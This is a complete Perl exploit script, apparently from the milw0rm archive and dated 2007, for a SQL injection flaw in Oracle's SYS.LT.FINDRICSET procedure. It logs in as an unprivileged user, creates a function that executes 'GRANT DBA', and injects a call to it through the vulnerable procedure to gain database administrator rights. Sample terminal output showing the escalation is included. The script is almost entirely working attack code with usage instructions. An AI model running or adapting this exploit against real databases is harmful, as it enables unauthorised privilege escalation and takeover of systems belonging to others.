#!/usr/bin/perl
#
# http://rawlab.mindcreations.com/codes/exp/oracle/sys-lt-findricset.pl
#
# Oracle SYS.LT.FINDRICSET exploit (11g/10g)
#
# Grant or revoke dba permission to unprivileged user
# 
# Tested on "Oracle Database 10g Enterprise Edition Release 10.1.0.5.0"
#
# Fixed with CPU Oct. 2007
# 
#   REF:    Thanks to Joxean Koret and his excellent Inguma 
#	    http://sourceforge.net/projects/inguma
#   
#   AUTHOR: Andrea "bunker" Purificato
#           http://rawlab.mindcreations.com
#
#   DATE:   Copyright 2007 - Fri Oct 26 15:03:46 CEST 2007
#
# Oracle InstantClient (basic + sdk) required for DBD::Oracle
# 
#
# bunker@fin:~$ perl sys-lt-findricset.pl -h localhost -s FAKE -u sfigato -p **** -r
#  [-] Wait...
#  [-] Revoking DBA from SFIGATO...
#  DBD::Oracle::db do failed: ORA-01031: insufficient privileges (DBD ERROR: OCIStmtExecute) [for Statement "REVOKE DBA FROM SFIGATO"] at sys-lt-findricset.pl line 86.
#  [-] Done!
# 
# bunker@fin:~$ perl sys-lt-findricset.pl -h localhost -s FAKE -u sfigato -p **** -g
#  [-] Wait...
#  [-] Creating evil function...
#  [-] Go...
#  [-] YOU GOT THE POWAH!!
#
# bunker@fin:~$ perl sys-lt-findricset.pl -h localhost -s FAKE -u sfigato -p **** -r
#  [-] Wait...
#  [-] Revoking DBA from SFIGATO...
#  [-] Done!
#

use warnings;
use strict;
use DBI;
use Getopt::Std;
use vars qw/ %opt /;

sub usage {
    print <<"USAGE";
    
Syntax: $0 -h <host> -s <sid> -u <user> -p <passwd> -g|-r [-P <port>]

Options:
     -h     <host>     target server address
     -s     <sid>      target sid name
     -u     <user>     user
     -p     <passwd>   password 

     -g|-r             (g)rant dba to user | (r)evoke dba from user
    [-P     <port>     Oracle port]

USAGE
    exit 0
}

my $opt_string = 'h:s:u:p:grP:';
getopts($opt_string, \%opt) or &usage;
&usage if ( !$opt{h} or !$opt{s} or !$opt{u} or !$opt{p} );
&usage if ( !$opt{g} and !$opt{r} );
my $user = uc $opt{u};

my $dbh = undef;
if ($opt{P}) {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s};port=$opt{P}", $opt{u}, $opt{p}) or die;
} else {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s}", $opt{u}, $opt{p}) or die;
}

my $sqlcmd = "GRANT DBA TO $user";
print "[-] Wait...\n";

if ($opt{r}) {
    print "[-] Revoking DBA from $user...\n";
    $sqlcmd = "REVOKE DBA FROM $user";
    $dbh->do( $sqlcmd );
    print "[-] Done!\n";
    $dbh->disconnect;
    exit;
}

print "[-] Creating evil function...\n";
$dbh->do( qq{
CREATE OR REPLACE FUNCTION OWN RETURN NUMBER 
 AUTHID CURRENT_USER AS 
 PRAGMA AUTONOMOUS_TRANSACTION; 
BEGIN
 EXECUTE IMMEDIATE '$sqlcmd'; COMMIT; 
 RETURN(0);
END;
} );
 
print "[-] Go...\n";
my $sth = $dbh->prepare( qq{
BEGIN
  SYS.LT.FINDRICSET('.''||$user.own||'''')--','x');
END;});
$sth->execute;
$sth->finish;
print "[-] YOU GOT THE POWAH!!\n";
$dbh->disconnect;
exit;

# milw0rm.com [2007-10-27]
